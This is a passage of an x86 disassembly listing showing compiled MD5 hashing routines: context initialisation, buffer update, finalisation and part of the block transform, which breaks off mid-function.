13145f61:	c7 00 01 23 45 67    	movl   $0x67452301,(%eax)
13145f67:	c7 40 04 89 ab cd ef 	movl   $0xefcdab89,0x4(%eax)
13145f6e:	c7 40 08 fe dc ba 98 	movl   $0x98badcfe,0x8(%eax)
13145f75:	c7 40 0c 76 54 32 10 	movl   $0x10325476,0xc(%eax)
13145f7c:	c3                   	ret    
13145f7d:	55                   	push   %ebp
13145f7e:	8b ec                	mov    %esp,%ebp
13145f80:	53                   	push   %ebx
13145f81:	56                   	push   %esi
13145f82:	8b 75 08             	mov    0x8(%ebp),%esi
13145f85:	57                   	push   %edi
13145f86:	8b 7d 10             	mov    0x10(%ebp),%edi
13145f89:	8b 4e 10             	mov    0x10(%esi),%ecx
13145f8c:	8b d7                	mov    %edi,%edx
13145f8e:	8b c1                	mov    %ecx,%eax
13145f90:	c1 e8 03             	shr    $0x3,%eax
13145f93:	8d 0c f9             	lea    (%ecx,%edi,8),%ecx
13145f96:	83 e0 3f             	and    $0x3f,%eax
13145f99:	c1 e2 03             	shl    $0x3,%edx
13145f9c:	3b ca                	cmp    %edx,%ecx
13145f9e:	89 4e 10             	mov    %ecx,0x10(%esi)
13145fa1:	73 03                	jae    0x13145fa6
13145fa3:	ff 46 14             	incl   0x14(%esi)
13145fa6:	6a 40                	push   $0x40
13145fa8:	8b cf                	mov    %edi,%ecx
13145faa:	5b                   	pop    %ebx
13145fab:	c1 e9 1d             	shr    $0x1d,%ecx
13145fae:	01 4e 14             	add    %ecx,0x14(%esi)
13145fb1:	2b d8                	sub    %eax,%ebx
13145fb3:	3b fb                	cmp    %ebx,%edi
13145fb5:	72 42                	jb     0x13145ff9
13145fb7:	53                   	push   %ebx
13145fb8:	8d 44 30 18          	lea    0x18(%eax,%esi,1),%eax
13145fbc:	ff 75 0c             	pushl  0xc(%ebp)
13145fbf:	50                   	push   %eax
13145fc0:	e8 ec 09 00 00       	call   0x131469b1
13145fc5:	8d 46 18             	lea    0x18(%esi),%eax
13145fc8:	50                   	push   %eax
13145fc9:	56                   	push   %esi
13145fca:	e8 b0 00 00 00       	call   0x1314607f
13145fcf:	83 c4 14             	add    $0x14,%esp
13145fd2:	89 5d 08             	mov    %ebx,0x8(%ebp)
13145fd5:	83 c3 3f             	add    $0x3f,%ebx
13145fd8:	3b df                	cmp    %edi,%ebx
13145fda:	73 19                	jae    0x13145ff5
13145fdc:	8b 45 0c             	mov    0xc(%ebp),%eax
13145fdf:	8d 44 18 c1          	lea    -0x3f(%eax,%ebx,1),%eax
13145fe3:	50                   	push   %eax
13145fe4:	56                   	push   %esi
13145fe5:	e8 95 00 00 00       	call   0x1314607f
13145fea:	83 45 08 40          	addl   $0x40,0x8(%ebp)
13145fee:	59                   	pop    %ecx
13145fef:	59                   	pop    %ecx
13145ff0:	83 c3 40             	add    $0x40,%ebx
13145ff3:	eb e3                	jmp    0x13145fd8
13145ff5:	33 c0                	xor    %eax,%eax
13145ff7:	eb 04                	jmp    0x13145ffd
13145ff9:	83 65 08 00          	andl   $0x0,0x8(%ebp)
13145ffd:	8b 4d 08             	mov    0x8(%ebp),%ecx
13146000:	8b 55 0c             	mov    0xc(%ebp),%edx
13146003:	2b f9                	sub    %ecx,%edi
13146005:	03 ca                	add    %edx,%ecx
13146007:	57                   	push   %edi
13146008:	8d 44 30 18          	lea    0x18(%eax,%esi,1),%eax
1314600c:	51                   	push   %ecx
1314600d:	50                   	push   %eax
1314600e:	e8 9e 09 00 00       	call   0x131469b1
13146013:	83 c4 0c             	add    $0xc,%esp
13146016:	5f                   	pop    %edi
13146017:	5e                   	pop    %esi
13146018:	5b                   	pop    %ebx
13146019:	5d                   	pop    %ebp
1314601a:	c3                   	ret    
1314601b:	55                   	push   %ebp
1314601c:	8b ec                	mov    %esp,%ebp
1314601e:	51                   	push   %ecx
1314601f:	51                   	push   %ecx
13146020:	56                   	push   %esi
13146021:	57                   	push   %edi
13146022:	8b 7d 0c             	mov    0xc(%ebp),%edi
13146025:	6a 08                	push   $0x8
13146027:	8d 45 f8             	lea    -0x8(%ebp),%eax
1314602a:	8d 77 10             	lea    0x10(%edi),%esi
1314602d:	56                   	push   %esi
1314602e:	50                   	push   %eax
1314602f:	e8 f2 08 00 00       	call   0x13146926
13146034:	8b 06                	mov    (%esi),%eax
13146036:	83 c4 0c             	add    $0xc,%esp
13146039:	c1 e8 03             	shr    $0x3,%eax
1314603c:	6a 38                	push   $0x38
1314603e:	83 e0 3f             	and    $0x3f,%eax
13146041:	59                   	pop    %ecx
13146042:	3b c1                	cmp    %ecx,%eax
13146044:	72 03                	jb     0x13146049
13146046:	6a 78                	push   $0x78
13146048:	59                   	pop    %ecx
13146049:	2b c8                	sub    %eax,%ecx
1314604b:	51                   	push   %ecx
1314604c:	68 64 07 15 13       	push   $0x13150764
13146051:	57                   	push   %edi
13146052:	e8 26 ff ff ff       	call   0x13145f7d
13146057:	8d 45 f8             	lea    -0x8(%ebp),%eax
1314605a:	6a 08                	push   $0x8
1314605c:	50                   	push   %eax
1314605d:	57                   	push   %edi
1314605e:	e8 1a ff ff ff       	call   0x13145f7d
13146063:	6a 10                	push   $0x10
13146065:	57                   	push   %edi
13146066:	ff 75 08             	pushl  0x8(%ebp)
13146069:	e8 b8 08 00 00       	call   0x13146926
1314606e:	6a 58                	push   $0x58
13146070:	6a 00                	push   $0x0
13146072:	57                   	push   %edi
13146073:	e8 57 09 00 00       	call   0x131469cf
13146078:	83 c4 30             	add    $0x30,%esp
1314607b:	5f                   	pop    %edi
1314607c:	5e                   	pop    %esi
1314607d:	c9                   	leave  
1314607e:	c3                   	ret    
1314607f:	55                   	push   %ebp
13146080:	8b ec                	mov    %esp,%ebp
13146082:	83 ec 48             	sub    $0x48,%esp
13146085:	53                   	push   %ebx
13146086:	56                   	push   %esi
13146087:	8b 75 08             	mov    0x8(%ebp),%esi
1314608a:	57                   	push   %edi
1314608b:	6a 40                	push   $0x40
1314608d:	8b 06                	mov    (%esi),%eax
1314608f:	ff 75 0c             	pushl  0xc(%ebp)
13146092:	8b 7e 04             	mov    0x4(%esi),%edi
13146095:	8b 5e 08             	mov    0x8(%esi),%ebx
13146098:	89 45 08             	mov    %eax,0x8(%ebp)
1314609b:	8b 46 0c             	mov    0xc(%esi),%eax
1314609e:	89 45 f8             	mov    %eax,-0x8(%ebp)
131460a1:	8d 45 b8             	lea    -0x48(%ebp),%eax
131460a4:	50                   	push   %eax
131460a5:	89 7d fc             	mov    %edi,-0x4(%ebp)
131460a8:	e8 be 08 00 00       	call   0x1314696b
131460ad:	8b c7                	mov    %edi,%eax
131460af:	8b cb                	mov    %ebx,%ecx
131460b1:	f7 d0                	not    %eax
131460b3:	23 45 f8             	and    -0x8(%ebp),%eax
131460b6:	23 cf                	and    %edi,%ecx
131460b8:	8b d7                	mov    %edi,%edx
131460ba:	0b c1                	or     %ecx,%eax
131460bc:	8b 4d 08             	mov    0x8(%ebp),%ecx
131460bf:	03 45 b8             	add    -0x48(%ebp),%eax
131460c2:	8d 8c 01 78 a4 6a d7 	lea    -0x28955b88(%ecx,%eax,1),%ecx
131460c9:	8b c1                	mov    %ecx,%eax
131460cb:	c1 e8 19             	shr    $0x19,%eax
131460ce:	c1 e1 07             	shl    $0x7,%ecx
131460d1:	0b c1                	or     %ecx,%eax
131460d3:	03 c7                	add    %edi,%eax
131460d5:	8b c8                	mov    %eax,%ecx
131460d7:	23 d0                	and    %eax,%edx
131460d9:	f7 d1                	not    %ecx
131460db:	23 cb                	and    %ebx,%ecx
131460dd:	0b ca                	or     %edx,%ecx
131460df:	8b 55 f8             	mov    -0x8(%ebp),%edx
131460e2:	03 4d bc             	add    -0x44(%ebp),%ecx
131460e5:	8d 94 0a 56 b7 c7 e8 	lea    -0x173848aa(%edx,%ecx,1),%edx
131460ec:	8b ca                	mov    %edx,%ecx
131460ee:	c1 e9 14             	shr    $0x14,%ecx
131460f1:	c1 e2 0c             	shl    $0xc,%edx
131460f4:	0b ca                	or     %edx,%ecx
131460f6:	03 c8                	add    %eax,%ecx
131460f8:	8b d1                	mov    %ecx,%edx
131460fa:	f7 d2                	not    %edx
131460fc:	23 d7                	and    %edi,%edx
131460fe:	8b f9                	mov    %ecx,%edi
13146100:	23 f8                	and    %eax,%edi
13146102:	0b d7                	or     %edi,%edx
13146104:	03 55 c0             	add    -0x40(%ebp),%edx
13146107:	8d 94 13 db 70 20 24 	lea    0x242070db(%ebx,%edx,1),%edx
1314610e:	8b d9                	mov    %ecx,%ebx
13146110:	8b fa                	mov    %edx,%edi
13146112:	c1 ef 0f             	shr    $0xf,%edi
13146115:	c1 e2 11             	shl    $0x11,%edx
13146118:	0b fa                	or     %edx,%edi
1314611a:	03 f9                	add    %ecx,%edi
1314611c:	8b d7                	mov    %edi,%edx
1314611e:	23 df                	and    %edi,%ebx
13146120:	f7 d2                	not    %edx
13146122:	23 d0                	and    %eax,%edx
13146124:	89 7d 0c             	mov    %edi,0xc(%ebp)
13146127:	0b d3                	or     %ebx,%edx
13146129:	8b 5d fc             	mov    -0x4(%ebp),%ebx
1314612c:	03 55 c4             	add    -0x3c(%ebp),%edx
1314612f:	8d 9c 13 ee ce bd c1 	lea    -0x3e423112(%ebx,%edx,1),%ebx
13146136:	8b d3                	mov    %ebx,%edx
13146138:	c1 e2 16             	shl    $0x16,%edx
1314613b:	c1 eb 0a             	shr    $0xa,%ebx
1314613e:	0b d3                	or     %ebx,%edx
13146140:	03 d7                	add    %edi,%edx
13146142:	8b da                	mov    %edx,%ebx
13146144:	23 fa                	and    %edx,%edi
13146146:	f7 d3                	not    %ebx
13146148:	23 d9                	and    %ecx,%ebx
1314614a:	0b df                	or     %edi,%ebx
1314614c:	03 5d c8             	add    -0x38(%ebp),%ebx
1314614f:	8d 84 18 af 0f 7c f5 	lea    -0xa83f051(%eax,%ebx,1),%eax
13146156:	8b f8                	mov    %eax,%edi
13146158:	c1 ef 19             	shr    $0x19,%edi
1314615b:	c1 e0 07             	shl    $0x7,%eax
1314615e:	0b f8                	or     %eax,%edi
13146160:	8b c2                	mov    %edx,%eax
13146162:	03 fa                	add    %edx,%edi
13146164:	89 7d 08             	mov    %edi,0x8(%ebp)
13146167:	23 45 08             	and    0x8(%ebp),%eax
1314616a:	f7 d7                	not    %edi
1314616c:	23 7d 0c             	and    0xc(%ebp),%edi
1314616f:	0b f8                	or     %eax,%edi
13146171:	03 7d cc             	add    -0x34(%ebp),%edi
13146174:	8d 8c 39 2a c6 87 47 	lea    0x4787c62a(%ecx,%edi,1),%ecx
1314617b:	8b c1                	mov    %ecx,%eax
1314617d:	c1 e8 14             	shr    $0x14,%eax
13146180:	c1 e1 0c             	shl    $0xc,%ecx
13146183:	0b c1                	or     %ecx,%eax
13146185:	03 45 08             	add    0x8(%ebp),%eax
13146188:	8b c8                	mov    %eax,%ecx
1314618a:	8b f8                	mov    %eax,%edi
1314618c:	23 7d 08             	and    0x8(%ebp),%edi
1314618f:	8b d8                	mov    %eax,%ebx
13146191:	f7 d1                	not    %ecx
13146193:	23 ca                	and    %edx,%ecx
13146195:	0b cf                	or     %edi,%ecx
13146197:	8b 7d 0c             	mov    0xc(%ebp),%edi
1314619a:	03 4d d0             	add    -0x30(%ebp),%ecx
1314619d:	8d bc 0f 13 46 30 a8 	lea    -0x57cfb9ed(%edi,%ecx,1),%edi
131461a4:	8b cf                	mov    %edi,%ecx
131461a6:	c1 e9 0f             	shr    $0xf,%ecx
131461a9:	c1 e7 11             	shl    $0x11,%edi
131461ac:	0b cf                	or     %edi,%ecx
131461ae:	03 c8                	add    %eax,%ecx
131461b0:	8b f9                	mov    %ecx,%edi
131461b2:	23 d9                	and    %ecx,%ebx
131461b4:	f7 d7                	not    %edi
131461b6:	23 7d 08             	and    0x8(%ebp),%edi
131461b9:	0b fb                	or     %ebx,%edi
131461bb:	8b d9                	mov    %ecx,%ebx
131461bd:	03 7d d4             	add    -0x2c(%ebp),%edi
131461c0:	8d 94 3a 01 95 46 fd 	lea    -0x2b96aff(%edx,%edi,1),%edx
131461c7:	8b fa                	mov    %edx,%edi
131461c9:	c1 e7 16             	shl    $0x16,%edi
131461cc:	c1 ea 0a             	shr    $0xa,%edx
131461cf:	0b fa                	or     %edx,%edi
131461d1:	03 f9                	add    %ecx,%edi
131461d3:	8b d7                	mov    %edi,%edx
131461d5:	23 df                	and    %edi,%ebx
131461d7:	f7 d2                	not    %edx
131461d9:	23 d0                	and    %eax,%edx
131461db:	89 7d fc             	mov    %edi,-0x4(%ebp)
131461de:	0b d3                	or     %ebx,%edx
131461e0:	8b 5d 08             	mov    0x8(%ebp),%ebx
131461e3:	03 55 d8             	add    -0x28(%ebp),%edx
131461e6:	8d 9c 13 d8 98 80 69 	lea    0x698098d8(%ebx,%edx,1),%ebx
131461ed:	8b d3                	mov    %ebx,%edx
131461ef:	c1 ea 19             	shr    $0x19,%edx
131461f2:	c1 e3 07             	shl    $0x7,%ebx
131461f5:	0b d3                	or     %ebx,%edx
131461f7:	03 d7                	add    %edi,%edx
131461f9:	8b da                	mov    %edx,%ebx
131461fb:	23 fa                	and    %edx,%edi
131461fd:	f7 d3                	not    %ebx
131461ff:	23 d9                	and    %ecx,%ebx
13146201:	0b df                	or     %edi,%ebx
13146203:	03 5d dc             	add    -0x24(%ebp),%ebx
13146206:	8d 84 18 af f7 44 8b 	lea    -0x74bb0851(%eax,%ebx,1),%eax
1314620d:	8b f8                	mov    %eax,%edi
1314620f:	c1 ef 14             	shr    $0x14,%edi
13146212:	c1 e0 0c             	shl    $0xc,%eax
13146215:	0b f8                	or     %eax,%edi
13146217:	03 fa                	add    %edx,%edi
13146219:	8b c7                	mov    %edi,%eax
1314621b:	8b df                	mov    %edi,%ebx
1314621d:	f7 d0                	not    %eax
1314621f:	23 45 fc             	and    -0x4(%ebp),%eax
13146222:	23 da                	and    %edx,%ebx
13146224:	0b c3                	or     %ebx,%eax
13146226:	03 45 e0             	add    -0x20(%ebp),%eax
13146229:	8d 8c 01 b1 5b ff ff 	lea    -0xa44f(%ecx,%eax,1),%ecx
13146230:	8b d9                	mov    %ecx,%ebx
13146232:	c1 eb 0f             	shr    $0xf,%ebx
13146235:	c1 e1 11             	shl    $0x11,%ecx
13146238:	0b d9                	or     %ecx,%ebx
1314623a:	8b cf                	mov    %edi,%ecx
1314623c:	03 df                	add    %edi,%ebx
1314623e:	8b c3                	mov    %ebx,%eax
13146240:	23 cb                	and    %ebx,%ecx
13146242:	f7 d0                	not    %eax
13146244:	23 c2                	and    %edx,%eax
13146246:	89 5d 0c             	mov    %ebx,0xc(%ebp)
13146249:	0b c1                	or     %ecx,%eax
1314624b:	8b 4d fc             	mov    -0x4(%ebp),%ecx
1314624e:	03 45 e4             	add    -0x1c(%ebp),%eax
13146251:	8d 8c 01 be d7 5c 89 	lea    -0x76a32842(%ecx,%eax,1),%ecx
13146258:	8b c1                	mov    %ecx,%eax
1314625a:	c1 e0 16             	shl    $0x16,%eax
1314625d:	c1 e9 0a             	shr    $0xa,%ecx
13146260:	0b c1                	or     %ecx,%eax
13146262:	03 c3                	add    %ebx,%eax
13146264:	8b c8                	mov    %eax,%ecx
13146266:	23 d8                	and    %eax,%ebx
13146268:	f7 d1                	not    %ecx
1314626a:	23 cf                	and    %edi,%ecx
1314626c:	0b cb                	or     %ebx,%ecx
1314626e:	03 4d e8             	add    -0x18(%ebp),%ecx
13146271:	8d 94 0a 22 11 90 6b 	lea    0x6b901122(%edx,%ecx,1),%edx
13146278:	8b ca                	mov    %edx,%ecx
1314627a:	c1 e9 19             	shr    $0x19,%ecx
1314627d:	c1 e2 07             	shl    $0x7,%edx
13146280:	0b ca                	or     %edx,%ecx
13146282:	8b d0                	mov    %eax,%edx
13146284:	03 c8                	add    %eax,%ecx
13146286:	89 4d 08             	mov    %ecx,0x8(%ebp)
13146289:	23 55 08             	and    0x8(%ebp),%edx
1314628c:	f7 d1                	not    %ecx
1314628e:	23 4d 0c             	and    0xc(%ebp),%ecx
13146291:	0b ca                	or     %edx,%ecx
13146293:	03 4d ec             	add    -0x14(%ebp),%ecx
13146296:	8d bc 0f 93 71 98 fd 	lea    -0x2678e6d(%edi,%ecx,1),%edi
1314629d:	8b cf                	mov    %edi,%ecx
1314629f:	c1 e9 14             	shr    $0x14,%ecx
131462a2:	c1 e7 0c             	shl    $0xc,%edi
131462a5:	0b cf                	or     %edi,%ecx
131462a7:	8b f8                	mov    %eax,%edi
131462a9:	03 4d 08             	add    0x8(%ebp),%ecx
131462ac:	89 4d fc             	mov    %ecx,-0x4(%ebp)
131462af:	8b d1                	mov    %ecx,%edx
131462b1:	f7 55 fc             	notl   -0x4(%ebp)
131462b4:	23 55 08             	and    0x8(%ebp),%edx
131462b7:	23 7d fc             	and    -0x4(%ebp),%edi
131462ba:	8b d9                	mov    %ecx,%ebx
131462bc:	0b d7                	or     %edi,%edx
131462be:	8b 7d 0c             	mov    0xc(%ebp),%edi
131462c1:	03 55 f0             	add    -0x10(%ebp),%edx
131462c4:	8d bc 17 8e 43 79 a6 	lea    -0x5986bc72(%edi,%edx,1),%edi
131462cb:	8b d7                	mov    %edi,%edx
131462cd:	c1 ea 0f             	shr    $0xf,%edx
131462d0:	c1 e7 11             	shl    $0x11,%edi
131462d3:	0b d7                	or     %edi,%edx
131462d5:	03 d1                	add    %ecx,%edx
131462d7:	89 55 0c             	mov    %edx,0xc(%ebp)
131462da:	23 da                	and    %edx,%ebx
131462dc:	f7 55 0c             	notl   0xc(%ebp)
131462df:	8b 7d 0c             	mov    0xc(%ebp),%edi
131462e2:	23 7d 08             	and    0x8(%ebp),%edi
131462e5:	0b fb                	or     %ebx,%edi
131462e7:	8b da                	mov    %edx,%ebx
131462e9:	03 7d f4             	add    -0xc(%ebp),%edi
131462ec:	23 5d fc             	and    -0x4(%ebp),%ebx
131462ef:	8d 84 38 21 08 b4 49 	lea    0x49b40821(%eax,%edi,1),%eax
131462f6:	8b f8                	mov    %eax,%edi
131462f8:	c1 e7 16             	shl    $0x16,%edi
131462fb:	c1 e8 0a             	shr    $0xa,%eax
131462fe:	0b f8                	or     %eax,%edi
13146300:	8b c1                	mov    %ecx,%eax
13146302:	03 fa                	add    %edx,%edi
13146304:	23 c7                	and    %edi,%eax
13146306:	0b c3                	or     %ebx,%eax
13146308:	8b 5d 08             	mov    0x8(%ebp),%ebx
1314630b:	03 45 bc             	add    -0x44(%ebp),%eax
1314630e:	8d 84 03 62 25 1e f6 	lea    -0x9e1da9e(%ebx,%eax,1),%eax
13146315:	8b d8                	mov    %eax,%ebx
13146317:	c1 eb 1b             	shr    $0x1b,%ebx
1314631a:	c1 e0 05             	shl    $0x5,%eax
1314631d:	0b d8                	or     %eax,%ebx
1314631f:	8b 45 0c             	mov    0xc(%ebp),%eax
13146322:	23 c7                	and    %edi,%eax
13146324:	03 df                	add    %edi,%ebx
13146326:	89 45 0c             	mov    %eax,0xc(%ebp)
13146329:	8b c2                	mov    %edx,%eax
1314632b:	23 c3                	and    %ebx,%eax
1314632d:	89 5d 08             	mov    %ebx,0x8(%ebp)
13146330:	8b d8                	mov    %eax,%ebx
13146332:	8b 45 0c             	mov    0xc(%ebp),%eax
13146335:	0b c3                	or     %ebx,%eax
13146337:	03 45 d0             	add    -0x30(%ebp),%eax
1314633a:	8d 8c 01 40 b3 40 c0 	lea    -0x3fbf4cc0(%ecx,%eax,1),%ecx
13146341:	8b c1                	mov    %ecx,%eax
13146343:	c1 e8 17             	shr    $0x17,%eax
13146346:	c1 e1 09             	shl    $0x9,%ecx
13146349:	0b c1                	or     %ecx,%eax
1314634b:	8b cf                	mov    %edi,%ecx
1314634d:	03 45 08             	add    0x8(%ebp),%eax
13146350:	f7 d1                	not    %ecx
13146352:	23 4d 08             	and    0x8(%ebp),%ecx
13146355:	8b d8                	mov    %eax,%ebx
13146357:	23 df                	and    %edi,%ebx
13146359:	0b cb                	or     %ebx,%ecx
1314635b:	03 4d e4             	add    -0x1c(%ebp),%ecx
1314635e:	8d 94 0a 51 5a 5e 26 	lea    0x265e5a51(%edx,%ecx,1),%edx
13146365:	8b ca                	mov    %edx,%ecx
13146367:	c1 e9 12             	shr    $0x12,%ecx
1314636a:	c1 e2 0e             	shl    $0xe,%edx
1314636d:	0b ca                	or     %edx,%ecx
1314636f:	8b 55 08             	mov    0x8(%ebp),%edx
13146372:	03 c8                	add    %eax,%ecx
13146374:	89 4d 0c             	mov    %ecx,0xc(%ebp)
13146377:	23 4d 08             	and    0x8(%ebp),%ecx
1314637a:	f7 d2                	not    %edx
1314637c:	23 d0                	and    %eax,%edx
1314637e:	8b 5d 0c             	mov    0xc(%ebp),%ebx
13146381:	0b d1                	or     %ecx,%edx
13146383:	03 55 b8             	add    -0x48(%ebp),%edx
13146386:	8d bc 17 aa c7 b6 e9 	lea    -0x16493856(%edi,%edx,1),%edi
1314638d:	8b d0                	mov    %eax,%edx
1314638f:	8b cf                	mov    %edi,%ecx
13146391:	c1 e1 14             	shl    $0x14,%ecx
13146394:	c1 ef 0c             	shr    $0xc,%edi
13146397:	0b cf                	or     %edi,%ecx
13146399:	8b f8                	mov    %eax,%edi
1314639b:	03 cb                	add    %ebx,%ecx
1314639d:	f7 d2                	not    %edx
1314639f:	23 d3                	and    %ebx,%edx
131463a1:	23 f9                	and    %ecx,%edi
131463a3:	0b d7                	or     %edi,%edx
131463a5:	8b 7d 08             	mov    0x8(%ebp),%edi
131463a8:	03 55 cc             	add    -0x34(%ebp),%edx
131463ab:	8d 94 17 5d 10 2f d6 	lea    -0x29d0efa3(%edi,%edx,1),%edx
131463b2:	8b fa                	mov    %edx,%edi
131463b4:	c1 ef 1b             	shr    $0x1b,%edi
131463b7:	c1 e2 05             	shl    $0x5,%edx
131463ba:	0b fa                	or     %edx,%edi
131463bc:	8b d3                	mov    %ebx,%edx
131463be:	03 f9                	add    %ecx,%edi
131463c0:	89 7d 08             	mov    %edi,0x8(%ebp)
131463c3:	8b fb                	mov    %ebx,%edi
131463c5:	23 7d 08             	and    0x8(%ebp),%edi
131463c8:	f7 d2                	not    %edx
131463ca:	23 d1                	and    %ecx,%edx
131463cc:	0b d7                	or     %edi,%edx
131463ce:	03 55 e0             	add    -0x20(%ebp),%edx
131463d1:	8d 84 10 53 14 44 02 	lea    0x2441453(%eax,%edx,1),%eax
131463d8:	8b d0                	mov    %eax,%edx
131463da:	c1 ea 17             	shr    $0x17,%edx
131463dd:	c1 e0 09             	shl    $0x9,%eax
131463e0:	0b d0                	or     %eax,%edx
131463e2:	8b c1                	mov    %ecx,%eax
131463e4:	03 55 08             	add    0x8(%ebp),%edx
131463e7:	f7 d0                	not    %eax
131463e9:	23 45 08             	and    0x8(%ebp),%eax
131463ec:	8b fa                	mov    %edx,%edi
131463ee:	23 f9                	and    %ecx,%edi
131463f0:	0b c7                	or     %edi,%eax
131463f2:	03 45 f4             	add    -0xc(%ebp),%eax
131463f5:	8d bc 03 81 e6 a1 d8 	lea    -0x275e197f(%ebx,%eax,1),%edi
131463fc:	8b c7                	mov    %edi,%eax
131463fe:	c1 e8 12             	shr    $0x12,%eax
13146401:	c1 e7 0e             	shl    $0xe,%edi
13146404:	0b c7                	or     %edi,%eax
13146406:	8b 7d 08             	mov    0x8(%ebp),%edi
13146409:	03 c2                	add    %edx,%eax
1314640b:	8b d8                	mov    %eax,%ebx
1314640d:	23 5d 08             	and    0x8(%ebp),%ebx
13146410:	f7 d7                	not    %edi
13146412:	23 fa                	and    %edx,%edi
13146414:	0b fb                	or     %ebx,%edi
13146416:	8b da                	mov    %edx,%ebx
13146418:	03 7d c8             	add    -0x38(%ebp),%edi
1314641b:	8d 8c 39 c8 fb d3 e7 	lea    -0x182c0438(%ecx,%edi,1),%ecx
13146422:	8b f9                	mov    %ecx,%edi
13146424:	c1 e7 14             	shl    $0x14,%edi
13146427:	c1 e9 0c             	shr    $0xc,%ecx
1314642a:	0b f9                	or     %ecx,%edi
1314642c:	8b ca                	mov    %edx,%ecx
1314642e:	03 f8                	add    %eax,%edi
13146430:	f7 d1                	not    %ecx
13146432:	23 c8                	and    %eax,%ecx
13146434:	23 df                	and    %edi,%ebx
13146436:	0b cb                	or     %ebx,%ecx
13146438:	8b 5d 08             	mov    0x8(%ebp),%ebx
1314643b:	03 4d dc             	add    -0x24(%ebp),%ecx
1314643e:	89 7d fc             	mov    %edi,-0x4(%ebp)
13146441:	8d 9c 0b e6 cd e1 21 	lea    0x21e1cde6(%ebx,%ecx,1),%ebx
13146448:	8b cb                	mov    %ebx,%ecx
1314644a:	c1 e9 1b             	shr    $0x1b,%ecx
1314644d:	c1 e3 05             	shl    $0x5,%ebx
13146450:	0b cb                	or     %ebx,%ecx
13146452:	8b d8                	mov    %eax,%ebx
13146454:	f7 d3                	not    %ebx
13146456:	03 cf                	add    %edi,%ecx
13146458:	23 df                	and    %edi,%ebx
1314645a:	8b f8                	mov    %eax,%edi
1314645c:	23 f9                	and    %ecx,%edi
1314645e:	0b df                	or     %edi,%ebx
13146460:	03 5d f0             	add    -0x10(%ebp),%ebx
13146463:	8d 94 1a d6 07 37 c3 	lea    -0x3cc8f82a(%edx,%ebx,1),%edx
1314646a:	8b fa                	mov    %edx,%edi
1314646c:	c1 ef 17             	shr    $0x17,%edi
1314646f:	c1 e2 09             	shl    $0x9,%edx
13146472:	0b fa                	or     %edx,%edi
13146474:	8b 55 fc             	mov    -0x4(%ebp),%edx
13146477:	03 f9                	add    %ecx,%edi
13146479:	8b df                	mov    %edi,%ebx
1314647b:	23 5d fc             	and    -0x4(%ebp),%ebx
1314647e:	f7 d2                	not    %edx
13146480:	23 d1                	and    %ecx,%edx
13146482:	0b d3                	or     %ebx,%edx
13146484:	03 55 c4             	add    -0x3c(%ebp),%edx
13146487:	8d 84 10 87 0d d5 f4 	lea    -0xb2af279(%eax,%edx,1),%eax
1314648e:	8b d0                	mov    %eax,%edx
13146490:	c1 ea 12             	shr    $0x12,%edx
13146493:	c1 e0 0e             	shl    $0xe,%eax
13146496:	0b d0                	or     %eax,%edx
13146498:	8b c1                	mov    %ecx,%eax
1314649a:	03 d7                	add    %edi,%edx
1314649c:	f7 d0                	not    %eax
1314649e:	8b da                	mov    %edx,%ebx
131464a0:	23 c7                	and    %edi,%eax
131464a2:	23 d9                	and    %ecx,%ebx
131464a4:	0b c3                	or     %ebx,%eax
131464a6:	8b 5d fc             	mov    -0x4(%ebp),%ebx
131464a9:	03 45 d8             	add    -0x28(%ebp),%eax
131464ac:	8d 84 03 ed 14 5a 45 	lea    0x455a14ed(%ebx,%eax,1),%eax
131464b3:	8b d8                	mov    %eax,%ebx
131464b5:	c1 e3 14             	shl    $0x14,%ebx
131464b8:	c1 e8 0c             	shr    $0xc,%eax
131464bb:	0b d8                	or     %eax,%ebx
131464bd:	8b c7                	mov    %edi,%eax
131464bf:	03 da                	add    %edx,%ebx
131464c1:	89 5d fc             	mov    %ebx,-0x4(%ebp)
131464c4:	8b df                	mov    %edi,%ebx
131464c6:	f7 d0                	not    %eax
131464c8:	23 c2                	and    %edx,%eax
131464ca:	23 5d fc             	and    -0x4(%ebp),%ebx
131464cd:	0b c3                	or     %ebx,%eax
131464cf:	03 45 ec             	add    -0x14(%ebp),%eax
131464d2:	8d 8c 01 05 e9 e3 a9 	lea    -0x561c16fb(%ecx,%eax,1),%ecx
131464d9:	8b c1                	mov    %ecx,%eax
131464db:	c1 e8 1b             	shr    $0x1b,%eax
131464de:	c1 e1 05             	shl    $0x5,%ecx
131464e1:	0b c1                	or     %ecx,%eax
131464e3:	8b ca                	mov    %edx,%ecx
131464e5:	03 45 fc             	add    -0x4(%ebp),%eax
131464e8:	89 45 08             	mov    %eax,0x8(%ebp)
131464eb:	8b c2                	mov    %edx,%eax
131464ed:	23 4d 08             	and    0x8(%ebp),%ecx
131464f0:	8b 5d 08             	mov    0x8(%ebp),%ebx
131464f3:	f7 d0                	not    %eax
131464f5:	23 45 fc             	and    -0x4(%ebp),%eax
131464f8:	0b c1                	or     %ecx,%eax
131464fa:	8b 4d fc             	mov    -0x4(%ebp),%ecx
131464fd:	03 45 c0             	add    -0x40(%ebp),%eax
13146500:	f7 d1                	not    %ecx
13146502:	23 cb                	and    %ebx,%ecx
13146504:	8d bc 07 f8 a3 ef fc 	lea    -0x3105c08(%edi,%eax,1),%edi
1314650b:	8b c7                	mov    %edi,%eax
1314650d:	c1 e8 17             	shr    $0x17,%eax
13146510:	c1 e7 09             	shl    $0x9,%edi
13146513:	0b c7                	or     %edi,%eax
13146515:	03 c3                	add    %ebx,%eax
13146517:	8b f8                	mov    %eax,%edi
13146519:	23 7d fc             	and    -0x4(%ebp),%edi
1314651c:	0b cf                	or     %edi,%ecx
1314651e:	03 4d d4             	add    -0x2c(%ebp),%ecx
13146521:	8d 94 0a d9 02 6f 67 	lea    0x676f02d9(%edx,%ecx,1),%edx
13146528:	8b ca                	mov    %edx,%ecx
1314652a:	c1 e9 12             	shr    $0x12,%ecx
1314652d:	c1 e2 0e             	shl    $0xe,%edx
13146530:	0b ca                	or     %edx,%ecx
13146532:	8b d3                	mov    %ebx,%edx
13146534:	03 c8                	add    %eax,%ecx
13146536:	f7 d2                	not    %edx
13146538:	8b f9                	mov    %ecx,%edi
1314653a:	23 d0                	and    %eax,%edx
1314653c:	23 fb                	and    %ebx,%edi
1314653e:	0b d7                	or     %edi,%edx
13146540:	8b 7d fc             	mov    -0x4(%ebp),%edi
13146543:	03 55 e8             	add    -0x18(%ebp),%edx
13146546:	8d bc 17 8a 4c 2a 8d 	lea    -0x72d5b376(%edi,%edx,1),%edi
1314654d:	8b d7                	mov    %edi,%edx
1314654f:	c1 e2 14             	shl    $0x14,%edx
13146552:	c1 ef 0c             	shr    $0xc,%edi
